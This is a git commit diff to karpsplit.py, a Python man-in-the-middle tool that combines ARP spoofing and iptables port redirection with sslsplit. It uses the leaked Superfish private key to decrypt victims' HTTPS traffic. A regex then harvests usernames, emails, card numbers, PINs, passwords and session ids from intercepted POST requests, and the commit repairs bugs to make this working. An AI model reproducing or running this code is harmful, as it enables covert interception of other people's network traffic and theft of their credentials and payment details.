3eb20db8c27ce9c66d5aded0e542dc64de5b9080
CodeFusion <codefusion1@gmail.com>
2016-02-28 16:40:29 +0000

    Working version

--- karpsplit.py
+++ karpsplit.py
@@ -1,16 +1,17 @@
-from subprocess import Popen, PIPE
+from subprocess import Popen, PIPE, DEVNULL
 import netifaces
 import re
 import time
 import sys
+import os
 
 
 def prep():
-    f = open("/pric/sys/net/ipv4/ip_forward", 'w')
-    print("1", file=f)
+    f = open("/proc/sys/net/ipv4/ip_forward", 'w')
+    f.write("1")
     f.close()
-    Popen(["iptables", "-t", "NAT", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"])
-    Popen(["iptables", "-t", "NAT", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "443", "-j", "REDIRECT", "--to-port", "8443"])
+    Popen(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"])
+    Popen(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "443", "-j", "REDIRECT", "--to-port", "8443"])
 
 
 def arpspoof(target = None):
@@ -26,25 +27,26 @@ def arpspoof(target = None):
 
 
 def sslsplit():
-    splitter = Popen(["sslsplit", "-k", "/root/superfishy-master/certificates/superfish-unprotected.key", "-c", "/root/superfishy-master/certificates/superfish.crt", "-L", "/dev/stdout", "ssl", "0.0.0.0", "8443"], stdout=PIPE)
+    splitter = Popen(["sslsplit", "-k", "/root/superfishy-master/certificates/superfish-unprotected.key", "-c", "/root/superfishy-master/certificates/superfish.crt", "-L", "/root/sslsplit/connections.txt", "ssl", "0.0.0.0", "8443"], stdout=DEVNULL, stderr=DEVNULL)
     return splitter
 
 
-def read_output(pipe):
+def read_output():
+    f = open("/root/sslsplit/connections.txt", 'r', encoding="ISO-8859-2")
 
     # https://regex101.com/r/wA9oY4/1
 
     # infinite loop
     while 1:
         # read all new data if any is available
-        conn_details = pipe.read()
+        conn_details = f.read()
         # if there is new data
         if conn_details != "":
             p = re.compile("(POST)(.*?)(?=GET|POST|\Z)", re.DOTALL)
             results = re.findall(p, conn_details)
             # for every result
             for result in results:
-                q = re.compile("(?:&|\?)((?:user|email|newcard|card|pin|pass|psw).{0,16})=(.*?)(?=&)", re.DOTALL | re.IGNORECASE)
+                q = re.compile("(?:&|\?|\s)((?:user|email|newcard|card|pin|pass|psw|sid).{0,16}?)=(.*?)(?=&|\s)", re.DOTALL | re.IGNORECASE)
                 deets = re.findall(q, result[1])
                 # if credentials are detected
                 if len(deets) > 0:
@@ -62,7 +64,7 @@ def read_output(pipe):
 
 print("\nKARPSplit v0.1\n")
 
-print("Preparing OS... ", end="")
+'''print("Preparing OS... ", end="")
 prep()
 print("Done")
 if len(sys.argv) > 1:
@@ -73,10 +75,12 @@ else:
     print("Starting ARP Spoof on all devices... ", end="")
     arpspoof()
     print("Done")
-time.sleep(1)
+time.sleep(1)'''
 print("Starting SSLSplit... ", end="")
 splitter = sslsplit()
 print("Done")
 time.sleep(1)
 print("Starting credential scanner...")
-read_output(splitter.stdout)
+read_output()
+time.sleep(40000)
+
